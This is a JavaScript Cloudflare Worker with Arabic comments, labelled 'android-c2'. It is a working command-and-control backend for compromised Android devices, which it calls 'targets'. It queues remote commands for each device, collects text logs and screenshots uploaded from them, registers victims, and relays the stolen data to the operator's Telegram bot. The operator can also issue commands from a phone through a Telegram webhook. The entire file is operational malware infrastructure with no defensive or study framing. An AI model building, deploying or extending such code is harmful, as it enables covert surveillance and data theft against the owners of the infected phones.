/* ============================================================
   android-c2 — قناة صاعدة/نازلة فورية عبر Durable Objects
   ============================================================ */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type,X-Token",
};

const json = (o, s = 200) => new Response(JSON.stringify(o), {
  status: s, headers: { ...CORS, "Content-Type": "application/json" } });
const txt = (t, s = 200) => new Response(t, { status: s, headers: CORS });

/* ---------- تيليجرام ---------- */
async function tg(env, text) {
  if (!env.TOKEN || !env.CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${env.TOKEN}/sendMessage`
      + `?chat_id=${env.CHAT}&disable_web_page_preview=true`
      + `&text=${encodeURIComponent(String(text).slice(0, 3900))}`);
  } catch {}
}

async function tgPhoto(env, b64, caption) {
  if (!env.TOKEN || !env.CHAT) return;
  try {
    const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const fd = new FormData();
    fd.append("chat_id", env.CHAT);
    fd.append("caption", String(caption || "").slice(0, 900));
    fd.append("photo", new Blob([bin], { type: "image/jpeg" }), "shot.jpg");
    await fetch(`https://api.telegram.org/bot${env.TOKEN}/sendPhoto`,
      { method: "POST", body: fd });
  } catch {}
}

/* ============================================================
   Durable Object: نسخة واحدة لكل هدف — متسقة فوراً
   ============================================================ */
export class Hub {
  constructor(state, env) {
    this.state = state;
    this.env = env;
    this.name = (state.id && state.id.name) || "T1";
  }

  async fetch(req) {
    const u = new URL(req.url);
    const p = u.pathname;
    const S = this.state.storage;

    /* ---------- نازل: ضبط أمر ---------- */
    if (p === "/cmd" && req.method === "POST") {
      const b = await req.json().catch(() => ({}));
      const seq = ((await S.get("seq")) || 0) + 1;
      const rec = { seq, cmd: String(b.cmd || ""), ts: Date.now() };
      await S.put({ seq, cmd: rec });
      return json(rec);
    }

    /* ---------- نازل: استطلاع ---------- */
    if (p === "/cmd") {
      const since = Number(u.searchParams.get("since") || 0);
      const rec = await S.get("cmd");
      if (!rec || rec.seq <= since) return json({ seq: since });
      return json(rec);
    }

    /* ---------- صاعد: نص ---------- */
    if (p === "/up" && req.method === "POST") {
      const b = await req.json().catch(() => ({}));
      const log = (await S.get("log")) || [];
      const e = { ts: Date.now(), text: String(b.m || "").slice(0, 4000) };
      log.push(e);
      if (log.length > 400) log.splice(0, log.length - 400);
      await S.put("log", log);
      await S.put("seen", Date.now());
      await tg(this.env, `[${this.name}] ${e.text}`);
      return json({ ok: 1, total: log.length });
    }

    /* ---------- صاعد: صورة ---------- */
    if (p === "/img" && req.method === "POST") {
      const b = await req.json().catch(() => ({}));
      const d = String(b.d || "");
      if (d) await S.put({ img: d, imgTs: Date.now() });

      const log = (await S.get("log")) || [];
      log.push({ ts: Date.now(),
        text: `📷 ${b.c || ""} (${Math.round(d.length * 0.75 / 1024)}KB)` });
      if (log.length > 400) log.splice(0, log.length - 400);
      await S.put("log", log);

      if (b.tg !== false) await tgPhoto(this.env, d, `[${this.name}] ${b.c || ""}`);
      return json({ ok: 1 });
    }

    /* ---------- للمشغّل: السجل ---------- */
    if (p === "/log") {
      const since = Number(u.searchParams.get("since") || 0);
      const log = (await S.get("log")) || [];
      return json({ total: log.length, items: log.slice(since) });
    }

    /* ---------- للمشغّل: آخر صورة ---------- */
    if (p === "/img") {
      const d = await S.get("img");
      if (!d) return txt("none", 404);
      if (u.searchParams.get("raw")) {
        const bin = Uint8Array.from(atob(d), c => c.charCodeAt(0));
        return new Response(bin, { headers: { ...CORS,
          "Content-Type": "image/jpeg", "Cache-Control": "no-store" } });
      }
      return json({ ts: await S.get("imgTs"), d });
    }

    /* ---------- الحالة ---------- */
    if (p === "/stat") {
      const [seq, cmd, log, seen, imgTs] = await Promise.all([
        S.get("seq"), S.get("cmd"), S.get("log"), S.get("seen"), S.get("imgTs")]);
      return json({ name: this.name, seq: seq || 0, cmd: cmd || null,
        logCount: (log || []).length, seen: seen || 0, imgTs: imgTs || 0 });
    }

    /* ---------- نبضة ---------- */
    if (p === "/ping") {
      await S.put("seen", Date.now());
      return json({ ok: 1, name: this.name });
    }

    /* ---------- سجل الأهداف ---------- */
    if (p === "/reg" && req.method === "POST") {
      const b = await req.json().catch(() => ({}));
      const names = (await S.get("names")) || [];
      if (b.name && !names.includes(b.name)) {
        names.push(b.name);
        await S.put("names", names);
      }
      return json({ ok: 1, names });
    }
    if (p === "/reg") return json((await S.get("names")) || []);

    return txt("?", 404);
  }
}

/* ============================================================
   الموجّه
   ============================================================ */
const hub = (env, name) => env.HUB.get(env.HUB.idFromName(name));

async function bodyTarget(req) {
  if (req.method !== "POST") return null;
  try { return (await req.clone().json()).t || null; } catch { return null; }
}

export default {
  async fetch(req, env) {
    const u = new URL(req.url);
    const p = u.pathname;

    if (req.method === "OPTIONS")
      return new Response(null, { status: 204, headers: CORS });

    /* ---------- ويب هوك تيليجرام: اكتب الأمر من هاتفك ---------- */
    if (p === "/api/tg") {
      if (env.TG_SECRET &&
          req.headers.get("X-Telegram-Bot-Api-Secret-Token") !== env.TG_SECRET)
        return txt("unauth", 401);

      const b = await req.json().catch(() => ({}));
      const line = (b.message || b.edited_message || {}).text || "";

      if (line === "/targets") {
        const names = await (await hub(env, "__registry")
          .fetch("https://do/reg")).json();
        await tg(env, "الأهداف:\n" + (names.join("\n") || "لا شيء"));
        return txt("ok");
      }

      const m = line.match(/^([A-Za-z0-9_-]+)\s*[:>]\s*([\s\S]+)$/);
      if (m) {
        const [, target, cmd] = m;
        await hub(env, target).fetch(new Request("https://do/cmd", {
          method: "POST", body: JSON.stringify({ cmd }) }));
        await tg(env, `→ ${target}: ${cmd.slice(0, 200)}`);
      } else if (line) {
        await tg(env, "الصيغة:  T1: الأمر");
      }
      return txt("ok");
    }

    /* ---------- الملفات الثابتة ---------- */
    if (!p.startsWith("/api/")) return env.ASSETS.fetch(req);

    /* ---------- الحماية: فقط POST /api/cmd يحتاج توكن ---------- */
    const needsAuth = (p === "/api/cmd" && req.method === "POST")
                   || p === "/api/targets";
    if (needsAuth && req.headers.get("X-Token") !== env.API_TOKEN)
      return txt("unauth", 401);

    /* ---------- قائمة الأهداف ---------- */
    if (p === "/api/targets")
      return hub(env, "__registry").fetch("https://do/reg");

    /* ---------- توجيه لكل هدف ---------- */
    const target = u.searchParams.get("t") || (await bodyTarget(req)) || "T1";

    if (p === "/api/ping") {
      await hub(env, "__registry").fetch(new Request("https://do/reg", {
        method: "POST", body: JSON.stringify({ name: target }) }));
    }

    const sub = new URL(req.url);
    sub.pathname = p.replace(/^\/api/, "");
    return hub(env, target).fetch(new Request(sub.toString(), req));
  },
};